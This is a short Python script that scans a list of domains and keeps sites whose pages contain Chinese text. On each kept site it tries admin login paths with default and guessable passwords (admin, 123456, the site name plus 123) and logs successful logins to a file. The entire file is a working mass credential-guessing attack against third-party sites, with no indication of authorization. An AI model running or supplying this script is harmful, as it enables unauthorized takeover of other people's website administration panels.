import urllib.request, re

domains = [l.strip() for l in open("/tmp/165_dm.txt") if l.strip()]
with open("/tmp/scan165_out.txt", "a") as out:
    for d in domains:
        d = d.strip()
        if not d: continue
        try:
            req = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
            h = urllib.request.urlopen(req, timeout=5).read().decode("utf-8","ignore")
        except:
            continue
        if len(h) < 500 or not re.search(r'[\u4e00-\u9fff]{10,}', h): continue
        name = d.split(".")[0]
        for p in ["/admin","/login","/admin/login","/admin.php"]:
            try:
                req2 = urllib.request.Request("http://"+d+p, headers={"User-Agent":"Mozilla/5.0"})
                h2 = urllib.request.urlopen(req2, timeout=5).read()
                s2 = len(h2)
                if s2 < 300: continue
                found = False
                for pw in ["admin","123456","admin123",name,name+"123"]:
                    data = ("username=admin&password="+pw).encode()
                    req3 = urllib.request.Request("http://"+d+p, data=data, headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                    try:
                        h3 = urllib.request.urlopen(req3, timeout=5).read()
                        s3 = len(h3)
                        if s3 > 3000 and s3 != s2:
                            out.write("PASS: {}|{}|{}|{}B\n".format(d,p,pw,s3))
                            out.flush()
                            found = True
                            break
                    except:
                        pass
                if found: break
            except:
                pass
